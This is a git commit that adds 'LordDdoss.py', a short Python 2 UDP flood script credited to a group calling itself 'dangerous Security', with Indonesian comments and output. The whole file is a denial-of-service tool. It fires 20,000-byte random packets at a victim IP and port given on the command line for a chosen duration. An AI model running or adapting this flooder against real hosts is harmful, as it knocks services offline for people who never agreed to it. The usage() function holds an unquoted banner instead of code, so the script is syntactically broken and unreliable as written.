2ee5d5562f90e387550c0af0a5969e1d83cc5767
dangerous-Security <64631272+dangerous-Security@users.noreply.github.com>
2020-05-01 18:02:10 +0430

    Create LordDdoss.py

---
+++ LordDdoss.py
@@ -0,0 +1,37 @@
+import time
+import socket
+import random
+import sys
+def usage():
+ ====================================================================
+ **                  Channel : @dangerousSecurit                   **
+ **                 Developers : dangerous Security Team           **
+ **               Team Members : MR.Cyber ,  Sir.jack              **
+ **                   Thank's : .::MR.Cyber::.                     **
+ ====================================================================
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
